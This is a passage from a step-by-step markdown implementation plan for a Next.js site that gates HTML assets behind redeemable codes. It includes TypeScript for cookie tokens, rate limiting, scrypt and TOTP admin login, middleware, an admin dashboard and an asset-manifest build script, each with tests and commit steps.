- Create: `src/app/failure.ts` (the single generic failure Response factory)
- Replace: `src/app/a/[slug]/route.ts` (spike → real)

- [ ] **Step 1: Real repo** `src/lib/db/codeRepo.ts`:

```ts
import { eq, sql } from "drizzle-orm";
import { db } from "./client";
import { codes } from "./schema";
import type { CodeRepo } from "@/lib/gate";

export const codeRepo: CodeRepo = {
  async findByCode(code) {
    const [r] = await db.select().from(codes).where(eq(codes.code, code)).limit(1);
    return r ?? null;
  },
  async findById(id) {
    const [r] = await db.select().from(codes).where(eq(codes.id, id)).limit(1);
    return r ?? null;
  },
  async recordUsage(id, now) {
    // Atomic increment — never read-modify-write (loses increments under concurrent redemptions).
    await db.update(codes)
      .set({ useCount: sql`${codes.useCount} + 1`, lastUsedAt: now })
      .where(eq(codes.id, id));
  },
};
```

- [ ] **Step 2: Asset reader** `src/lib/assets.ts`:

```ts
import { readFile } from "node:fs/promises";
import path from "node:path";

const SLUG_RE = /^[A-Za-z0-9_-]{22}$/;
export function isValidSlug(slug: string): boolean { return SLUG_RE.test(slug); }

export async function readAssetHtml(slug: string): Promise<string | null> {
  if (!isValidSlug(slug)) return null;
  try {
    return await readFile(path.join(process.cwd(), "assets", slug, "index.html"), "utf8");
  } catch {
    return null;
  }
}
```

- [ ] **Step 3: Generic failure Response** `src/app/failure.ts` (byte-identical for every failure — spec §3, §6 step 3):

```ts
const BODY = "<!doctype html><meta charset=utf-8><title>Unavailable</title><p>This link is invalid or has expired.</p>";

/** One canonical failure response. Same body/status/headers for unknown-slug and bad-code. */
export function failurePage(): Response {
  return new Response(BODY, {
    status: 200,
    headers: {
      "content-type": "text/html; charset=utf-8",
      "referrer-policy": "no-referrer",
      "x-robots-tag": "noindex, nofollow, noarchive",
    },
  });
}
```

- [ ] **Step 4: Asset CSP header helper** — append to `src/app/failure.ts`:

```ts
export const ASSET_CSP =
  "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; " +
  "connect-src 'self'; img-src 'self' data:; form-action 'self'; frame-ancestors 'none'; base-uri 'none'";

export function assetHeaders(): HeadersInit {
  return {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": ASSET_CSP,
    "referrer-policy": "no-referrer",
    "x-robots-tag": "noindex, nofollow, noarchive",
    "cache-control": "private, no-store",
  };
}
```

- [ ] **Step 5: Replace the route** `src/app/a/[slug]/route.ts` (full redemption-redirect flow — spec §6):

> **Do NOT** log `req.url`, `code`, or the cookie value anywhere in this handler — the code is the entire secret (see `docs/pitfalls/implementation-pitfalls.md`).

```ts
import { NextResponse, type NextRequest } from "next/server";
import { assetHeaders, failurePage } from "@/app/failure";
import { readAssetHtml, isValidSlug } from "@/lib/assets";
import { codeRepo } from "@/lib/db/codeRepo";
import { redeemCode, recheckCode } from "@/lib/gate";
import { signAssetToken, verifyAssetToken } from "@/lib/crypto/tokens";

export const dynamic = "force-dynamic";

const COOKIE_TTL = 24 * 60 * 60; // 24h (spec §6)
const secret = () => process.env.ASSET_COOKIE_SECRET!;
const cookieName = (slug: string) => `asset_access_${slug}`;

export async function GET(req: NextRequest, { params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;
  if (!isValidSlug(slug)) return failurePage();
  const code = req.nextUrl.searchParams.get("code");
  const now = new Date();

  // Step 2/4: redemption precedence — a present ?code always re-validates + re-issues.
  if (code) {
    const res = await redeemCode(codeRepo, code, slug, now).catch(() => null);
    if (!res) return failurePage();
    const token = await signAssetToken({ slug, cid: res.cid }, secret(), COOKIE_TTL);
    const redirect = NextResponse.redirect(new URL(`/a/${slug}`, req.url), { status: 302 });
    redirect.cookies.set(cookieName(slug), token, {
      httpOnly: true, secure: true, sameSite: "lax",
      path: `/a/${slug}`, maxAge: COOKIE_TTL,
    });
    return redirect;
  }

  // Step 5: clean load — verify cookie, then re-check code in DB (fail closed).
  const token = req.cookies.get(cookieName(slug))?.value;
  if (!token) return failurePage();
  const claims = await verifyAssetToken(token, slug, secret());
  if (!claims) return failurePage();
  if (!(await recheckCode(codeRepo, claims.cid, slug, now))) return failurePage();

  const html = await readAssetHtml(slug);
  if (html === null) return failurePage();
  return new Response(html, { headers: assetHeaders() });
}
```

- [ ] **Step 6: Remove the spike asset** (real assets come via Phase 6):

```bash
rm -rf assets/spike00000000000000000000
```

- [ ] **Step 7: Manual smoke** (real DB needed for full flow; without DB, assert the no-code/no-cookie path returns the failure body):

Run: `npm run dev` then `curl -sS -i "http://localhost:3000/a/aaaaaaaaaaaaaaaaaaaaaa"`
Expected: `200` with "invalid or has expired" body (no cookie, no code). Stop dev server.

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "feat: /a/[slug] gate with redemption-redirect, cookie, fail-closed recheck"
```

### Task 3.3: Global headers + robots.txt

**Files:**
- Create: `src/app/robots.ts`
- Modify: `next.config.ts` (global headers)

- [ ] **Step 1: `src/app/robots.ts`** (spec §9 — `Disallow: /`):

```ts
import type { MetadataRoute } from "next";
export default function robots(): MetadataRoute.Robots {
  return { rules: [{ userAgent: "*", disallow: "/" }] };
}
```

- [ ] **Step 2: Global `X-Robots-Tag` header** — add a `headers()` block to `next.config.ts` (merge with existing config):

```ts
  async headers() {
    return [{ source: "/:path*", headers: [{ key: "X-Robots-Tag", value: "noindex, nofollow, noarchive" }] }];
  },
```

- [ ] **Step 3: Verify**

Run: `npm run dev` then `curl -sS http://localhost:3000/robots.txt` and `curl -sSI http://localhost:3000/ | grep -i x-robots-tag`
Expected: robots body has `Disallow: /`; header present. Stop dev server.

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "feat: robots.txt Disallow:/ and global X-Robots-Tag noindex"
```

### Task 3.4: Rate limiting on `/a/*`

**Files:**
- Create: `src/lib/ratelimit.ts`, `src/lib/ratelimit.test.ts`
- Modify: `src/app/a/[slug]/route.ts` (apply to the `?code=` redemption path)

- [ ] **Step 1: Failing test** `src/lib/ratelimit.test.ts` (fake store; control time):

```ts
import { expect, test, vi } from "vitest";
import { checkRateLimit } from "./ratelimit";

test("allows under the limit, blocks at the limit within the window", async () => {
  const store = new Map<string, { count: number; windowStart: number }>();
  const repo = {
    get: vi.fn(async (k: string) => store.get(k) ?? null),
    set: vi.fn(async (k: string, v: { count: number; windowStart: number }) => void store.set(k, v)),
  };
  const t0 = 1_000_000;
  for (let i = 0; i < 5; i++) expect(await checkRateLimit(repo, "k", 5, 60_000, t0)).toBe(true);
  expect(await checkRateLimit(repo, "k", 5, 60_000, t0)).toBe(false); // 6th in window
  expect(await checkRateLimit(repo, "k", 5, 60_000, t0 + 61_000)).toBe(true); // new window
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- ratelimit`
Expected: FAIL.

- [ ] **Step 3: Implement** `src/lib/ratelimit.ts`:

```ts
export interface RateStore {
  get(key: string): Promise<{ count: number; windowStart: number } | null>;
  set(key: string, v: { count: number; windowStart: number }): Promise<void>;
}

/** Fixed-window limiter. Returns true if allowed. `nowMs` injected for tests. */
export async function checkRateLimit(store: RateStore, key: string, limit: number, windowMs: number, nowMs: number): Promise<boolean> {
  const cur = await store.get(key);
  if (!cur || nowMs - cur.windowStart >= windowMs) {
    await store.set(key, { count: 1, windowStart: nowMs });
    return true;
  }
  if (cur.count >= limit) return false;
  await store.set(key, { count: cur.count + 1, windowStart: cur.windowStart });
  return true;
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- ratelimit`
Expected: PASS.

- [ ] **Step 5: Add the Postgres-backed store** `src/lib/db/rateStore.ts` (used by the route; not unit-tested here — logic is covered by Step 1's fake):

```ts
import { eq } from "drizzle-orm";
import { db } from "./client";
import { rateLimits } from "./schema";
import type { RateStore } from "@/lib/ratelimit";

export const rateStore: RateStore = {
  async get(key) {
    const [r] = await db.select().from(rateLimits).where(eq(rateLimits.key, key)).limit(1);
    return r ? { count: r.count, windowStart: r.windowStart.getTime() } : null;
  },
  async set(key, v) {
    await db.insert(rateLimits).values({ key, count: v.count, windowStart: new Date(v.windowStart) })
      .onConflictDoUpdate({ target: rateLimits.key, set: { count: v.count, windowStart: new Date(v.windowStart) } });
  },
};
```

- [ ] **Step 6: Apply to the redemption path.** In `src/app/a/[slug]/route.ts`, add two static imports to the existing top-of-file import block:

```ts
import { checkRateLimit } from "@/lib/ratelimit";
import { rateStore } from "@/lib/db/rateStore";
```

Then, inside `if (code) {` as the first statements (before `redeemCode`), add:

```ts
    const allowed = await checkRateLimit(rateStore, `a:${slug}`, 20, 60_000, now.getTime()).catch(() => true);
    if (!allowed) return failurePage();
```

> Scope note (matches spec §9): this limits per-slug only. A separate global limiter is deliberately **not** added here — codes are 128-bit so entropy is the real anti-guessing defense and this limiter is defense-in-depth. Do NOT add per-IP limiting (defeated by rotation; punishes shared-NAT recipients).

- [ ] **Step 7: Commit**

```bash
git add -A
git commit -m "feat: fixed-window rate limiting on gate redemption (Postgres store)"
```

**BEFORE marking Phase 3 complete:** Review batch from ≥3 perspectives (security invariants, fail-closed, header correctness). Confirm negative tests exist for: wrong slug, revoked-on-recheck, DB-down-fails-closed, no-cookie. Run `npm test` green. Update banner + table.

---

## Phase 4 — Admin auth (password + TOTP)

**Execution Status:** ⬜ NOT STARTED

> Read `docs/pitfalls/implementation-pitfalls.md` → "TOTP replay needs persisted state", "Admin is production-only". Assertion-rigor rule from Phase 3 applies to TOTP-step tests (control the clock; never sleep).

### Task 4.1: Password hashing (scrypt) + setup script

**Files:**
- Create: `src/lib/auth/password.ts`, `src/lib/auth/password.test.ts`
- Create: `scripts/admin-setup.mjs`

- [ ] **Step 1: Failing test** `src/lib/auth/password.test.ts`:

```ts
import { expect, test } from "vitest";
import { hashPassword, verifyPassword } from "./password";

test("verifies a correct password and rejects a wrong one", async () => {
  const hash = await hashPassword("correct horse");
  expect(await verifyPassword("correct horse", hash)).toBe(true);
  expect(await verifyPassword("wrong", hash)).toBe(false);
});
test("rejects a malformed hash without throwing", async () => {
  expect(await verifyPassword("x", "garbage")).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- password`
Expected: FAIL.

- [ ] **Step 3: Implement** `src/lib/auth/password.ts` (scrypt + constant-time compare):

```ts
import { randomBytes, scrypt, timingSafeEqual } from "node:crypto";
import { promisify } from "node:util";
const scryptAsync = promisify(scrypt);

export async function hashPassword(password: string): Promise<string> {
  const salt = randomBytes(16);
  const dk = (await scryptAsync(password, salt, 64)) as Buffer;
  return `scrypt$${salt.toString("hex")}$${dk.toString("hex")}`;
}

export async function verifyPassword(password: string, stored: string): Promise<boolean> {
  try {
    const [scheme, saltHex, hashHex] = stored.split("$");
    if (scheme !== "scrypt" || !saltHex || !hashHex) return false;
    const dk = (await scryptAsync(password, Buffer.from(saltHex, "hex"), 64)) as Buffer;
    const expected = Buffer.from(hashHex, "hex");
    return dk.length === expected.length && timingSafeEqual(dk, expected);
  } catch {
    return false;
  }
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- password`
Expected: PASS.

- [ ] **Step 5: Setup script** `scripts/admin-setup.mjs` (prints env values to paste into Vercel — TOTP secret + QR URL + password hash):

```js
// Self-contained (no imports from src/) so it runs with plain `node` pre-build.
import { randomBytes, scrypt } from "node:crypto";
import { promisify } from "node:util";
import * as OTPAuth from "otpauth";

const scryptAsync = promisify(scrypt);

const password = process.argv[2];
if (!password) { console.error("usage: node scripts/admin-setup.mjs <password>"); process.exit(1); }

// MUST match src/lib/auth/password.ts exactly: scrypt$<saltHex>$<dkHex>, dk length 64.
const salt = randomBytes(16);
const dk = await scryptAsync(password, salt, 64);
const hash = `scrypt$${salt.toString("hex")}$${dk.toString("hex")}`;

const secret = new OTPAuth.Secret({ size: 20 });
const totp = new OTPAuth.TOTP({ issuer: "share-site", label: "admin", secret });

console.log("ADMIN_PASSWORD_HASH=" + hash);
console.log("ADMIN_TOTP_SECRET=" + secret.base32);
console.log("Scan this otpauth URI in your authenticator:");
console.log(totp.toString());
```

> The scrypt format here MUST stay identical to `src/lib/auth/password.ts` (`hashPassword`) — same `scrypt$salt$dk` layout, same 64-byte length — or `verifyPassword` will reject the generated hash.

- [ ] **Step 6: Commit**

```bash
git add src/lib/auth/password.ts src/lib/auth/password.test.ts scripts/admin-setup.mjs
git commit -m "feat: scrypt password hashing + admin-setup script"
```

### Task 4.2: TOTP verify + replay rejection

**Files:**
- Create: `src/lib/auth/totp.ts`, `src/lib/auth/totp.test.ts`
- Create: `src/lib/db/totpStore.ts`

- [ ] **Step 1: Failing tests** `src/lib/auth/totp.test.ts` (control the clock; replay rejected via injected store):

```ts
import { expect, test, vi } from "vitest";
import * as OTPAuth from "otpauth";
import { verifyTotp } from "./totp";

const secret = "JBSWY3DPEHPK3PXP";
const totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(secret) });
const at = 1_700_000_000_000; // fixed epoch ms
const token = totp.generate({ timestamp: at });

function fakeStore() {
  const used = new Set<number>();
  return { markUsed: vi.fn(async (s: number) => (used.has(s) ? false : (used.add(s), true))) };
}

test("accepts a valid code and marks the step used", async () => {
  const store = fakeStore();
  expect(await verifyTotp(secret, token, store, at)).toBe(true);
});
test("rejects a replay of the same step", async () => {
  const store = fakeStore();
  expect(await verifyTotp(secret, token, store, at)).toBe(true);
  expect(await verifyTotp(secret, token, store, at)).toBe(false); // replay
});
test("rejects a wrong code", async () => {
  expect(await verifyTotp(secret, "000000", fakeStore(), at)).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- totp`
Expected: FAIL.

- [ ] **Step 3: Implement** `src/lib/auth/totp.ts` (±1 window; replay via store):

```ts
import * as OTPAuth from "otpauth";

export interface TotpStepStore {
  /** Returns true if `step` was newly marked (i.e., not a replay). */
  markUsed(step: number): Promise<boolean>;
}

const PERIOD = 30;

export async function verifyTotp(secretB32: string, token: string, store: TotpStepStore, nowMs: number): Promise<boolean> {
  const totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(secretB32), period: PERIOD });
  const delta = totp.validate({ token, timestamp: nowMs, window: 1 }); // ±1 step, or null
  if (delta === null) return false;
  const step = Math.floor(nowMs / 1000 / PERIOD) + delta;
  return await store.markUsed(step); // replay → false
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- totp`
Expected: PASS.

- [ ] **Step 5: Postgres step store** `src/lib/db/totpStore.ts` (unique-violation = replay):

```ts
import { db } from "./client";
import { totpUsedSteps } from "./schema";
import type { TotpStepStore } from "@/lib/auth/totp";

export const totpStore: TotpStepStore = {
  async markUsed(step) {
    try {
      // Single insert: onConflictDoNothing + returning() yields a row only when newly inserted.
      // A replayed step conflicts on the PK → no row returned → false.
      const rows = await db.insert(totpUsedSteps).values({ step }).onConflictDoNothing().returning();
      return rows.length > 0;
    } catch {
      return false; // fail closed
    }
  },
};
```

- [ ] **Step 6: Commit**

```bash
git add src/lib/auth/totp.ts src/lib/auth/totp.test.ts src/lib/db/totpStore.ts
git commit -m "feat: TOTP verify (±1 window) + replay rejection via totp_used_steps"
```

### Task 4.3: Session + login action + middleware guard (production-only)

**Files:**
- Create: `src/lib/auth/session.ts`
- Create: `src/app/admin/login/page.tsx`, `src/app/admin/login/actions.ts`
- Create: `src/middleware.ts`

- [ ] **Step 1: Session helpers** `src/lib/auth/session.ts`:

```ts
import { cookies } from "next/headers";
import { signSession, verifySession } from "@/lib/crypto/tokens";

const NAME = "admin_session";
const TTL = 7 * 24 * 60 * 60; // 7 days (spec §8)

export async function startSession(): Promise<void> {
  const token = await signSession(process.env.SESSION_SECRET!, TTL);
  (await cookies()).set(NAME, token, { httpOnly: true, secure: true, sameSite: "strict", path: "/", maxAge: TTL });
}

export async function isAuthed(): Promise<boolean> {
  const t = (await cookies()).get(NAME)?.value;
  return t ? await verifySession(t, process.env.SESSION_SECRET!) : false;
}
```

- [ ] **Step 2: Login server action** `src/app/admin/login/actions.ts` (CSRF: Origin check + POST-only via server action; production gate; rate-limited):

```ts
"use server";
import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { verifyPassword } from "@/lib/auth/password";
import { verifyTotp } from "@/lib/auth/totp";
import { totpStore } from "@/lib/db/totpStore";
import { startSession } from "@/lib/auth/session";
import { checkRateLimit } from "@/lib/ratelimit";
import { rateStore } from "@/lib/db/rateStore";

export async function login(_prev: unknown, form: FormData): Promise<{ error?: string }> {
  const h = await headers();
  const origin = h.get("origin");
  const host = h.get("host");
  if (origin && new URL(origin).host !== host) return { error: "bad origin" };

  const allowed = await checkRateLimit(rateStore, "login", 10, 5 * 60_000, Date.now()).catch(() => true);
  if (!allowed) return { error: "too many attempts" };

  const password = String(form.get("password") ?? "");
  const totp = String(form.get("totp") ?? "");
  const okPw = await verifyPassword(password, process.env.ADMIN_PASSWORD_HASH!);
  const okTotp = await verifyTotp(process.env.ADMIN_TOTP_SECRET!, totp, totpStore, Date.now());
  if (!okPw || !okTotp) return { error: "invalid credentials" };

  await startSession();
  redirect("/admin"); // throws NEXT_REDIRECT; never returns on success
}
```

- [ ] **Step 3: Login page** `src/app/admin/login/page.tsx`:

```tsx
"use client";
import { useActionState } from "react";
import { login } from "./actions";

export default function LoginPage() {
  // On success the action redirects (throws NEXT_REDIRECT); only errors flow back into state.
  const [state, action] = useActionState(login, {} as { error?: string });
  return (
    <form action={action}>
      <input name="password" type="password" placeholder="Password" autoComplete="current-password" />
      <input name="totp" inputMode="numeric" placeholder="6-digit code" autoComplete="one-time-code" />
      <button type="submit">Sign in</button>
      {state?.error ? <p role="alert">{state.error}</p> : null}
    </form>
  );
}
```

- [ ] **Step 4: Middleware guard** `src/middleware.ts` (production-only + auth; spec §8):

```ts
import { NextResponse, type NextRequest } from "next/server";
import { verifySession } from "@/lib/crypto/tokens";

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;
  if (!pathname.startsWith("/admin")) return NextResponse.next();

  // Production-only: /admin is inert on preview/dev (spec §8, §11).
  if (process.env.VERCEL_ENV && process.env.VERCEL_ENV !== "production") {
    return new NextResponse("<!doctype html><title>Unavailable</title>", {
      status: 200, headers: { "content-type": "text/html; charset=utf-8" },
    });
  }
  if (pathname.startsWith("/admin/login")) return NextResponse.next();

  const token = req.cookies.get("admin_session")?.value;
  const ok = token ? await verifySession(token, process.env.SESSION_SECRET!) : false;
  if (!ok) return NextResponse.redirect(new URL("/admin/login", req.url));
  return NextResponse.next();
}

export const config = { matcher: ["/admin", "/admin/:path*"] };
```

- [ ] **Step 5: Verify build compiles**

Run: `npm run build`
Expected: build succeeds (no type errors). (Full auth flow needs DB + env; covered in Phase 7 deploy verification.)

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "feat: admin session, login action (CSRF+rate-limit), production-only middleware guard"
```

**BEFORE marking Phase 4 complete:** Review vs pitfalls (replay store real? production gate present? Origin check present?). Confirm TOTP replay test + wrong-cred test exist. `npm test` green, `npm run build` green. Update banner + table.

---

## Phase 5 — Admin panel UI

**Execution Status:** ⬜ NOT STARTED

> Depends on Phase 4 (auth) + Phase 6's manifest shape (defined below in Task 6.2 — the `manifest.json` = `{ [slug]: { title } }`). If executing 5 before 6, stub `assets/manifest.json` as `{}`.

### Task 5.1: Manifest reader + code list/query helpers

**Files:**
- Create: `src/lib/manifest.ts`, `src/lib/manifest.test.ts`
- Create: `src/lib/db/adminRepo.ts`

- [ ] **Step 1: Failing test** `src/lib/manifest.test.ts` (orphan detection — spec §8):

```ts
import { expect, test } from "vitest";
import { findOrphans } from "./manifest";

test("flags codes whose slug is not in the manifest", () => {
  const manifest = { aaaaaaaaaaaaaaaaaaaaaa: { title: "A" } };
  const codes = [
    { assetSlug: "aaaaaaaaaaaaaaaaaaaaaa" },
    { assetSlug: "bbbbbbbbbbbbbbbbbbbbbb" },
  ];
  expect(findOrphans(codes, manifest)).toEqual(["bbbbbbbbbbbbbbbbbbbbbb"]);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- manifest`
Expected: FAIL.

- [ ] **Step 3: Implement** `src/lib/manifest.ts`:

```ts
import { readFile } from "node:fs/promises";
import path from "node:path";

export type Manifest = Record<string, { title: string }>;

export async function readManifest(): Promise<Manifest> {
  try {
    return JSON.parse(await readFile(path.join(process.cwd(), "assets", "manifest.json"), "utf8"));
  } catch {
    return {};
  }
}

export function findOrphans(codes: { assetSlug: string }[], manifest: Manifest): string[] {
  const known = new Set(Object.keys(manifest));
  return [...new Set(codes.map((c) => c.assetSlug).filter((s) => !known.has(s)))];
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- manifest`
Expected: PASS.

- [ ] **Step 5: Admin repo** `src/lib/db/adminRepo.ts` (list/create/revoke — server-only):

```ts
import { desc, eq } from "drizzle-orm";
import { db } from "./client";
import { codes } from "./schema";
import { generateCode, defaultExpiry } from "@/lib/codes";

export async function listCodes() {
  return db.select().from(codes).orderBy(desc(codes.createdAt));
}

export async function createCode(assetSlug: string, label: string, expiresAt: Date | null) {
  const now = new Date();
  const code = generateCode();
  await db.insert(codes).values({ code, assetSlug, label, expiresAt: expiresAt ?? defaultExpiry(now) });
  return code;
}

export async function revokeCode(id: string) {
  await db.update(codes).set({ revokedAt: new Date() }).where(eq(codes.id, id));
}
```

- [ ] **Step 6: Commit**

```bash
git add src/lib/manifest.ts src/lib/manifest.test.ts src/lib/db/adminRepo.ts
git commit -m "feat: manifest reader, orphan detection, admin code repo"
```

### Task 5.2: Admin dashboard page + actions

**Files:**
- Create: `src/app/admin/page.tsx`, `src/app/admin/actions.ts`

- [ ] **Step 1: Server actions** `src/app/admin/actions.ts` (Origin-checked mutations — spec §8 CSRF):

```ts
"use server";
import { headers } from "next/headers";
import { revalidatePath } from "next/cache";
import { createCode, revokeCode } from "@/lib/db/adminRepo";

async function assertSameOrigin() {
  const h = await headers();
  const origin = h.get("origin");
  const host = h.get("host");
  if (origin && new URL(origin).host !== host) throw new Error("bad origin");
}

export async function createCodeAction(form: FormData) {
  await assertSameOrigin();
  const slug = String(form.get("slug") ?? "");
  const label = String(form.get("label") ?? "");
  const daysRaw = String(form.get("days") ?? "");
  const days = daysRaw ? Number(daysRaw) : null;
  const expiresAt = days && Number.isFinite(days) ? new Date(Date.now() + days * 86_400_000) : null;
  await createCode(slug, label, expiresAt);
  revalidatePath("/admin");
}

export async function revokeCodeAction(form: FormData) {
  await assertSameOrigin();
  await revokeCode(String(form.get("id") ?? ""));
  revalidatePath("/admin");
}
```

- [ ] **Step 2: Dashboard page** `src/app/admin/page.tsx` (server component; unstyled but functional — spec §8 panel features):

```tsx
import { listCodes } from "@/lib/db/adminRepo";
import { readManifest, findOrphans } from "@/lib/manifest";
import { createCodeAction, revokeCodeAction } from "./actions";

// Reads DB + filesystem at request time — never prerender (would run with no DATABASE_URL at build).
export const dynamic = "force-dynamic";

function status(c: { revokedAt: Date | null; expiresAt: Date }): string {
  if (c.revokedAt) return "revoked";
  if (c.expiresAt.getTime() <= Date.now()) return "expired";
  return "active";
}

export default async function AdminPage() {
  const [codes, manifest] = await Promise.all([listCodes(), readManifest()]);
  const orphans = new Set(findOrphans(codes, manifest));
  const slugs = Object.entries(manifest);
  return (
    <main>
      <h1>Assets & codes</h1>

      <h2>Generate code</h2>
      <form action={createCodeAction}>
        <select name="slug">
          {slugs.map(([slug, m]) => <option key={slug} value={slug}>{m.title} ({slug})</option>)}
        </select>
        <input name="label" placeholder="Recipient label" />
        <input name="days" inputMode="numeric" placeholder="Expiry days (blank = 90)" />
        <button type="submit">Generate</button>
      </form>

      <h2>Codes</h2>
      <table>
        <thead><tr><th>Label</th><th>Asset</th><th>Status</th><th>Redemptions</th><th>Link</th><th></th></tr></thead>
        <tbody>
          {codes.map((c) => (
            <tr key={c.id}>
              <td>{c.label}{orphans.has(c.assetSlug) ? " ⚠ orphaned" : ""}</td>
              <td>{manifest[c.assetSlug]?.title ?? c.assetSlug}</td>
              <td>{status(c)}</td>
              <td>{c.useCount}</td>
              <td><code>{`/a/${c.assetSlug}?code=${c.code}`}</code></td>
              <td>
                <form action={revokeCodeAction}>
                  <input type="hidden" name="id" value={c.id} />
                  <button type="submit" disabled={!!c.revokedAt}>Revoke</button>
                </form>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </main>
  );
}
```

> **Do NOT** add auth checks in the page — the middleware (Task 4.3) already gates `/admin/*`. **Do NOT** style beyond this; visual polish is out of scope for this plan.

- [ ] **Step 3: Trace `assets/manifest.json` into the `/admin` lambda.** The admin page reads it from disk at request time; without this it is not bundled and the dropdown is empty in production. Extend `outputFileTracingIncludes` in `next.config.ts`:

```ts
  outputFileTracingIncludes: {
    "/a/[slug]": ["./assets/**/*.html"],
    "/admin": ["./assets/manifest.json"],
  },
```

- [ ] **Step 4: Verify build compiles**

Run: `npm run build`
Expected: success. At this point `build-manifest` isn't wired yet (Phase 6), so `assets/manifest.json` may not exist — `readManifest()` catches that and returns `{}`, so the dropdown is simply empty until Phase 6. If you want a non-empty build check now, create `assets/manifest.json` with `{}` first.

- [ ] **Step 5: Commit**

```bash
git add src/app/admin/ next.config.ts
git commit -m "feat: admin dashboard — generate/list/revoke codes, orphan flagging, copyable links"
```

**BEFORE marking Phase 5 complete:** confirm `use_count` is labeled "Redemptions" (spec §5). `npm test` + `npm run build` green. Update banner + table.

---

## Phase 6 — Asset pipeline (generator + manifest)

**Execution Status:** ⬜ NOT STARTED

> Read `docs/pitfalls/implementation-pitfalls.md` → "Cookie Path + opaque slugs". Build step enforces the slug contract that Phase 3 relies on.

### Task 6.1: `new-asset` generator

**Files:**
- Create: `scripts/new-asset.mjs`

- [ ] **Step 1: Implement** `scripts/new-asset.mjs`:

```js
import { randomBytes } from "node:crypto";
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";

const title = process.argv.slice(2).join(" ").trim() || "Untitled asset";
const slug = randomBytes(16).toString("base64url"); // 22 chars, 128-bit
const dir = path.join(process.cwd(), "assets", slug);
await mkdir(dir, { recursive: true });
await writeFile(path.join(dir, "index.html"),
  `<!doctype html>\n<meta charset="utf-8">\n<title>${title}</title>\n<h1>${title}</h1>\n`);
console.log("Created assets/%s/index.html", slug);
console.log("Slug (opaque):", slug);
```

- [ ] **Step 2: Verify**

Run: `npm run new-asset -- "Test Report"` then `ls assets/`
Expected: a 22-char folder with `index.html`. Delete it afterward: `rm -rf assets/<slug>`.

- [ ] **Step 3: Commit**

```bash
git add scripts/new-asset.mjs
git commit -m "feat: new-asset generator (opaque 128-bit slug + scaffold)"
```

### Task 6.2: Build-manifest step with slug + external-origin checks

**Files:**
- Create: `scripts/build-manifest.mjs`, `scripts/build-manifest.test.ts` (test the pure checks)
- Modify: `package.json` (`prebuild` hook), `.gitignore` (ignore generated `assets/manifest.json`)

- [ ] **Step 1: Failing test** `scripts/build-manifest.test.ts` (extract the pure functions to test them):

```ts
import { expect, test } from "vitest";
import { extractTitle, hasExternalOrigin, validateSlug } from "./manifest-lib.mjs";

test("extractTitle reads <title>, falls back to slug", () => {
  expect(extractTitle("<title>Hi</title>", "slug00000000000000000")).toBe("Hi");
  expect(extractTitle("<h1>no title</h1>", "slug00000000000000000x")).toBe("slug00000000000000000x");
});
test("hasExternalOrigin flags http(s) references", () => {
  expect(hasExternalOrigin(`<script src="https://cdn.example/x.js"></script>`)).toBe(true);
  expect(hasExternalOrigin(`<img src="data:image/png;base64,AAAA">`)).toBe(false);
  expect(hasExternalOrigin(`<script>const x=1</script>`)).toBe(false);
});
test("validateSlug requires 22 base64url chars", () => {
  expect(validateSlug("A7fK9dZ2qR3sT1uV5wXyB0")).toBe(true);
  expect(validateSlug("acme-corp")).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- build-manifest`
Expected: FAIL.

- [ ] **Step 3: Implement the pure lib** `scripts/manifest-lib.mjs`:

```js
export function extractTitle(html, fallback) {
  const m = html.match(/<title>([^<]*)<\/title>/i);
  const t = m?.[1]?.trim();
  return t && t.length > 0 ? t : fallback;
}
export function hasExternalOrigin(html) {
  // Flags http(s):// references in src/href attributes (external origins). data: and relative are fine.
  return /(?:src|href)\s*=\s*["']https?:\/\//i.test(html);
}
export function validateSlug(slug) {
  return /^[A-Za-z0-9_-]{22}$/.test(slug);
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- build-manifest`
Expected: PASS.

- [ ] **Step 5: Implement the build script** `scripts/build-manifest.mjs`:

```js
import { readdir, readFile, writeFile, stat } from "node:fs/promises";
import path from "node:path";
import { extractTitle, hasExternalOrigin, validateSlug } from "./manifest-lib.mjs";

const assetsDir = path.join(process.cwd(), "assets");
const manifest = {};
let entries = [];
try { entries = await readdir(assetsDir); } catch { /* no assets yet */ }

for (const slug of entries) {
  if (slug === "manifest.json") continue;
  const dir = path.join(assetsDir, slug);
  if (!(await stat(dir)).isDirectory()) continue;
  if (!validateSlug(slug)) { console.error(`FAIL: slug "${slug}" is not 22 base64url chars`); process.exit(1); }
  if (manifest[slug]) { console.error(`FAIL: duplicate slug "${slug}"`); process.exit(1); }
  const html = await readFile(path.join(dir, "index.html"), "utf8").catch(() => null);
  if (html === null) { console.error(`FAIL: ${slug}/index.html missing`); process.exit(1); }
  if (hasExternalOrigin(html)) { console.error(`FAIL: ${slug} references an external origin (must be self-contained)`); process.exit(1); }
  manifest[slug] = { title: extractTitle(html, slug) };
}
await writeFile(path.join(assetsDir, "manifest.json"), JSON.stringify(manifest, null, 2) + "\n");
console.log(`Wrote manifest with ${Object.keys(manifest).length} asset(s).`);
```

- [ ] **Step 6: Wire `prebuild`** — add to `package.json` scripts:

```json
"prebuild": "node scripts/build-manifest.mjs"
```

Add to `.gitignore`:

```
/assets/manifest.json
```

- [ ] **Step 7: Verify end-to-end**

Run: `npm run new-asset -- "Demo"` then `npm run build-manifest` then `cat assets/manifest.json`
